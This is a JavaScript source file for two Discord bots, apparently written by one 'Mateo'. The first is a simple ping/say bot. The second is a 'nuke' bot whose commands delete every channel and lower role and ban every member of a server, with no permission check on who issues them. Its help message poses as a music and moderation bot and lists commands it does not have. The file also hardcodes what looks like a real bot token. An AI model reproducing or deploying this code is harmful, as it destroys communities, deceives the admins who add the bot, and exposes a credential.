
const Discord = require('discord.js');
const client = new Discord.Client();

client.on('ready', () => {
    client.user.setActivity('Bot desarrollado por Mateo', {type: 'WATCHING'});
    console.log('Listo!');
});


let prefix = process.env.PREFIX;

client.on('message', message => {
    if (!message.content.startsWith(prefix) || !message.guild) return;
    if (message.author.bot) return;
    
    const cont = message.content.split(' ').slice(1);
    const args = cont.join(' ');

    if (message.content.startsWith(prefix+'ping')){
        message.channel.send('pong');

    } else if (message.content.startsWith(prefix+ 'say')) {
        if (!args) return;
        message.channel.send(args);
    }
});

client.login(process.env.TOKEN);

const discord = require("discord.js");
const nuke = new discord.Client();


nuke.on("ready", () =>{
console.log("Este bot ha sido desarrollado por Mateo.")
console.log(`${nuke.user.tag} is online.`);
nuke.user.setPresence({ game: { name: `n!help` }, type: 0 });
});

nuke.on("message", async(msg)=>{



if(msg.content.toLowerCase().startsWith("n!" + "nuke")){
    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
    msg.guild.members.tap(member => member.ban("Nuke Bot | Dev : MATEO"));
}
if(msg.content.toLowerCase().startsWith("n!" + "delete")){
    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
}
if(msg.content.toLowerCase().startsWith("n!" + "ban")){
    msg.guild.members.tap(member => member.ban("Nuke Bot | Dev : MATEO"));
}
if(msg.content.toLowerCase().startsWith("n!" + "help")){
    msg.author.send({
        embed: {
            color: 0xff0000,
            author: { name: "Moderation Bot" },
            description: "n!play-Reproduce una canción n!stop-Detiene la reproducción n!ban- Banea a un usuario n!warn -Warnea a un usuario n!kick -Patea a un usuario del servidor"
        }
    })
}
});

nuke.login("NzU1MDMzOTYzMjk0MzU5NjQz.X19aLA.cuxMH885imV_fgD_OYtJShXHkzg");